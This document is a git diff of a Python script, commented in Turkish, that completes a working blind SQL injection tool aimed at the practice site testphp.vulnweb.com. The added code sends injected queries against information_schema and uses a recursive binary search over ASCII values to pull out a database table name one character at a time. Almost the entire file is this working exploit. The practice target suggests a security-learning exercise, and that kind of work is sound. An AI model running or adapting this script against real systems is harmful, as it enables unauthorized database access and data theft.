@@ -1,81 +1,93 @@
 # -*- coding: utf-8 -*-
 # BLIND SQL injection test
+# CANERC 190725
 # KORAYY 190725
 import requests
 
+# GLOBAL degiskenler
+url = "http://testphp.vulnweb.com/product.php?pic=1"
+valid_text = "pageName"
+
+
+# bu fonksiyon ulasilmaya calisilan tablonun adının
+# kac karakter oldugunu hesaplamaktadir.
 def find_table_length(url):
-    found = False
     i = 3
-    #TODO: sql_payload parametrik yap
     res = requests.get(url)
-    while not found:
+    while True:
         sql_payload = " ((SELECT length(table_name) from " + \
                       " information_schema.tables where " + \
-                      " table_schema=database() LIMIT 0,1) = " + \
+                      " table_schema=database() LIMIT 1) = " + \
                       str(i) + ")"
-        vuln_url =  url + " and " + sql_payload
+        vuln_url = url + " and " + sql_payload
         vuln_res = requests.get(vuln_url)
-        if len(vuln_res.text) == len(res.text):
-            found = True
-            #print("Found at", i)
+        if valid_text in vuln_res.text:
+            # print("Found at", i)
             break
         i = i + 1
     return i
 
-# iki sayfanın eş değerliliğini kontrol eder
-def pages_equal(url1, url2):
-    #TODO: sayfadaki bir string in olup olmadığına bakan
-    #metod olsa daha generic olur //MEHMET INCE
-    return len(url1) == len(url2)
 
-def binarySearch(min, max, str_pos):
-    #TODO:
-    pass
+# bu fonksiyon, özyinelemeli (recursive) olarak tablonun adındaki
+# incelenen pozisyonda bulunan karakterin ascii degerini sayfadan alan
+# true/false degerleri yardimiyla bulmak amaciyla kodlanmistir.
+# binarySearch algoritmasının bir uyarlamasıdır.
+def binarySearch(min_val, max_val, str_pos):
+    guess = round((min_val + max_val) / 2)
+    # print(guess)
+    sql_payload_lt = "ascii(substring( (SELECT table_name from " + \
+                     "information_schema.tables " + \
+                     "where table_schema=database() " + \
+                     "LIMIT 1), " + \
+                     str(str_pos) + ", 1))" + \
+                     "<" + str(guess)
 
+    sql_payload_gt = "ascii(substring( (SELECT table_name from " + \
+                     "information_schema.tables " + \
+                     "where table_schema=database() " + \
+                     "LIMIT 1), " + \
+                     str(str_pos) + ", 1))" + \
+                     ">" + str(guess)
+
+    vuln_url_lt = url + " and " + sql_payload_lt
+    vuln_res_lt = requests.get(vuln_url_lt)
+
+    if valid_text in vuln_res_lt.text:
+        return binarySearch(min_val, guess, str_pos)
+    else:
+        vuln_url_gt = url + " and " + sql_payload_gt
+        vuln_res_gt = requests.get(vuln_url_gt)
+        if valid_text in vuln_res_gt.text:
+            return binarySearch(guess, max_val, str_pos)
+        else:
+            # print('guess:', chr(guess), 'pos:', str(str_pos))
+            return guess
+
+
+# bu fonksiyon ana fonksiyon olup uzunluğu ve karakter sayisi bilinen
+# tablo adının herbir karakternin ascii degerini bulmak için yazılmis
+# bir döngü ve sonuçlari birlestirmeye yarar.
 def find_table_name(url, len_table):
     offset = 0
     table_length = find_table_length(url)
-    #offset 1 artacak ama len_table boyutu kadar
-    #oncesinde tablo length i bulunmali!
-    #65 ile 122 arasi bakilacak
-    ascii_min = 32
-    ascii_max = 122
+    ascii_min_val = 32
+    ascii_max_val = 126
     table_name_str = ''
 
     res = requests.get(url)
-    #while True:
+    # while True:
     for i in range(table_length):
         str_pos = i + 1
-        # tam ortada olabilir. guess imiz ascii_mid
-        ascii_mid = round((ascii_min + ascii_max)/2)
-        
-        sql_payload = "ascii(substring( (SELECT table_name from " + \
-                                        "information_schema.tables " + \
-                                        "where table_schema=database() " + \
-                                        "LIMIT " + str(offset) + ",1), " +  \
-                                         str_pos + ", 1))" + \
-                                        ">" + str(ascii_mid)
-        
-
-        vuln_url = url + " and " + sql_payload 
-
-        
-        vuln_res = requests.get(vuln_url)
-        
-        # > ascii_mid durumu
-        if res == vuln_res:
-            ascii_min = ascii_mid
-        # < ascii_mid durumu
-        else:
-            ascii_max = ascii_mid
-
-        #if ascii_min - 
-        
-
-    #print(len(res.text))
-    #print(len(vuln_res.text))
+        # ascii_guess_char = chr(binarySearch(ascii_min_val, ascii_max_val, str_pos))
+        table_name_str += chr(binarySearch(ascii_min_val, ascii_max_val, str_pos))
+    return table_name_str
 
 
-url = "http://estphp.vulnweb.com/product.php?pic=1"
-len_table = find_table_length(url)
-print(len_table)
+# ana program
+def main():
+    len_table = find_table_length(url)
+    # print(len_table)
+    print(find_table_name(url, len_table))
+
+
+main()
